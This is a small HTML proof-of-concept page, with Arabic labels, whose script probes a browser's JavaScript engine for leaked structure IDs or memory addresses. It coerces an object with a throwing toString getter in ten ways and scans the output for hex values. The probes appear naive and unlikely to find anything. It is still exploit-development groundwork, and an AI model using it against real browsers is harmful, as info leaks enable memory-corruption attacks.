<!DOCTYPE html>
<html>
<body>
<h2>PoC 1: Structure ID Leak Hunter</h2>
<button onclick="runLeakHunt()">ابدأ البحث</button>
<div id="log" style="font-family: monospace; white-space: pre;"></div>

<script>
function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
    console.log(msg);
}

// دالة مساعدة: استخراج أي hex من string
function extractHex(str) {
    const matches = str.match(/0x[0-9a-fA-F]+/g) || [];
    return matches;
}

function runLeakHunt() {
    log('=== Structure ID Leak Hunter ===\n');
    
    // 1. إنشاء object فاسد
    const corruptObj = {};
    Object.defineProperty(corruptObj, 'toString', {
        get: function() {
            throw new Error('Corrupted object access');
        }
    });
    
    // 2. تجربة كل طريقة ممكنة لتسريب معلومات
    const leakMethods = [
        () => { try { return JSON.stringify(corruptObj); } catch(e) { return e.message; }},
        () => { try { return String(corruptObj); } catch(e) { return e.message; }},
        () => { try { return Object.prototype.toString.call(corruptObj); } catch(e) { return e.message; }},
        () => { try { return `${corruptObj}`; } catch(e) { return e.message; }},
        () => { try { return corruptObj + ''; } catch(e) { return e.message; }},
        () => { try { return [].join.call(corruptObj); } catch(e) { return e.message; }},
        () => { try { return Array.from(corruptObj); } catch(e) { return e.message; }},
        () => { try { return Object.keys(corruptObj); } catch(e) { return e.message; }},
        () => { try { return Object.values(corruptObj); } catch(e) { return e.message; }},
        () => { try { return Object.entries(corruptObj); } catch(e) { return e.message; }},
    ];
    
    leakMethods.forEach((fn, i) => {
        try {
            const result = fn();
            const hexLeaked = extractHex(String(result));
            if (hexLeaked.length > 0) {
                log(`🔥 LEAK FOUND! Method ${i}: ${hexLeaked.join(', ')}`);
            } else {
                log(`Method ${i}: No hex leak (${String(result).substring(0,50)})`);
            }
        } catch(e) {
            const hexLeaked = extractHex(e.message || String(e));
            if (hexLeaked.length > 0) {
                log(`🔥 LEAK IN ERROR! Method ${i}: ${hexLeaked.join(', ')}`);
            }
        }
    });
    
    log('\n=== البحث اكتمل ===');
}
</script>
</body>
</html>
